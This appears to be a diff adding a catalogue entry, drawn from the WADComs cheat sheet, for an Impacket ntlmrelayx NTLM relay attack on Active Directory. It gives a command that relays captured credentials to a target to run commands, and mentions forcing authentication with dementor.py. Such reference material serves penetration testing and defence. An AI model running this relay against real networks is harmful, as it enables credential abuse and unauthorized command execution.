@@ -1,0 +1,83 @@
+id: wadcoms/Impacket-NTLMRelayX
+type: technique
+platform: active-directory
+name: Impacket NTLMRelayX
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: none
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- no credentials required
+commands:
+- template: python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -c 'whoami /all' -debug
+  comment: "Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and\
+    \ relaying credentials to various different protocols (SMB, HTTP, LDAP, etc.).\n\nThe below command\
+    \ creates an SMB relay server that targets the IP 10.10.10.1, meaning any credentials that the SMB\
+    \ server recieves, gets relayed to that IP to attempt to authenticate and execute 'whoami /all'. In\
+    \ order for the SMB server to recieve credentials to relay, dementor.py can be used to trigger a forced\
+    \ authentication from the IP it's targeting to an attacker controlled SMB server.\n\nCommand Reference:\n\
+    \n\tTarget IP: 10.10.10.1\n"
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
+- https://www.praetorian.com/blog/active-directory-computer-account-smb-relaying-attack
+tags:
+- active-directory
+- wadcoms
+- ntlm
+source_data:
+  WADComs:
+    raw:
+      file: Impacket-NTLMRelayX.md
+      document: "---\ndescription: |\n  Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating\
+        \ an SMB and HTTP server and relaying credentials to various different protocols (SMB, HTTP, LDAP,\
+        \ etc.).\n\n  The below command creates an SMB relay server that targets the IP 10.10.10.1, meaning\
+        \ any credentials that the SMB server recieves, gets relayed to that IP to attempt to authenticate\
+        \ and execute 'whoami /all'. In order for the SMB server to recieve credentials to relay, dementor.py\
+        \ can be used to trigger a forced authentication from the IP it's targeting to an attacker controlled\
+        \ SMB server.\n\n  Command Reference:\n\n  \tTarget IP: 10.10.10.1\n\ncommand: |\n  python3 ntlmrelayx.py\
+        \ -smb2support -t smb://10.10.10.1 -c 'whoami /all' -debug\nitems:\n  - No_Creds\nservices:\n\
+        \  - NTLM\nOS:\n  - Linux\n  - Windows\nattack_types:\n  - Exploitation\nreferences:\n  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py\n\
+        \  - https://www.praetorian.com/blog/active-directory-computer-account-smb-relaying-attack\n---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  privilege_required:
+    value: none
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:cc2ca281eef254e72cff2c3ad27b98ceab999c963a82b44b35341017069b01da
